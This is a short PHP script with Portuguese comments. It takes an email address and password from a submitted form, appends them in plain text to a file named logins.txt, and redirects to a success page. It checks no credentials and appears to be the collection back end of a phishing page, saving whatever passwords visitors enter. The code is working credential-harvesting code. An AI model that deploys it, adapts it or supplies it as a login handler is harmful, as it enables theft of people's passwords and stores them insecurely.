<?php
// Verifica se o formulário foi enviado via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtém os valores enviados
    $email = $_POST['email'];
    $senha = $_POST['senha'];

    // Salva no arquivo logins.txt
    $arquivo = 'logins.txt';
    $conteudo = "Email: $email | Senha: $senha\n";
    file_put_contents($arquivo, $conteudo, FILE_APPEND | LOCK_EX);

    // Redireciona para a página de sucesso
    header('Location: success.html');
    exit();
}

